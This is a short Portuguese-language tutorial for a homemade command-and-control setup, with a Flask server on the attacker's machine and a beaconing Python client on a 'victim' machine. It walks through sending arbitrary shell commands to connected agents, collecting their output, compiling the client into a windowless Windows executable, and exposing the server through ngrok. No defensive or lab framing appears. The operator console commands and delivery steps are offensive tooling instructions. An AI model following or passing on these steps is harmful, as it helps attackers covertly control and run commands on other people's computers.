# C2 — Command & Control — Tutorial

## Dependencias
```bash
pip install flask requests
```

---

## Fluxo
```
[Vitima]  c2_client.py  ---> GET /beacon?id=abc123  ---> [Atacante] c2_server.py
[Vitima]  <--- {"cmd": "whoami"}                    <---
[Vitima]  run whoami
[Vitima]  POST /result {output: "nt authority\\system"} --->
[Atacante] imprime output no console
```

---

## c2_server.py (maquina do atacante)

```bash
python c2_server.py
# Port: 4443
```

**Console interativo:**
```
C2> list                          # lista agentes conectados
C2> cmd abc123 whoami             # envia comando para agente abc123
C2> cmd abc123 ipconfig /all      # qualquer comando shell
C2> results abc123                # ver saidas recebidas
C2> exit
```

---

## c2_client.py (maquina da vitima)

```bash
python c2_client.py
# C2 URL: http://192.168.1.10:4443
```

O cliente beacona a cada 5 segundos.  
Ajuste `SLEEP` no topo do arquivo para mudar o intervalo.

---

## Opcoes de entrega do cliente

```bash
# Compilar para executavel (Windows):
pip install pyinstaller
pyinstaller --onefile --noconsole c2_client.py
# Executavel em dist/c2_client.exe

# Expor servidor via ngrok (sem VPS):
ngrok http 4443
# Use a URL gerada no c2_client.py
```
